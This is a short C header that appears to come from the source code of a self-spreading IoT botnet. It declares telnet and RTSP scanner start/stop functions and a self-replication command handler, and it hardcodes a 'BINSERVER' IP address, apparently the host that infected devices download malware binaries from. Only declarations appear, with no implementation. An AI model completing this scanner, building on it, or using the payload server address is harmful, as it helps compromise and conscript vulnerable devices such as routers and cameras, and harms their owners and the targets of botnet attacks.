#pragma once

#ifndef SCANNER_H
#define SCANNER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <errno.h>

#define BINSERVER "117.50.197.134" 

extern pthread_mutex_t scanner_mutex;

void handle_selfrep_command(char *command);
void start_telnet_scanner(void);
void stop_telnet_scanner(void);
void start_rtsp_scanner(void);
void stop_rtsp_scanner(void);

#endif // SCANNER_H
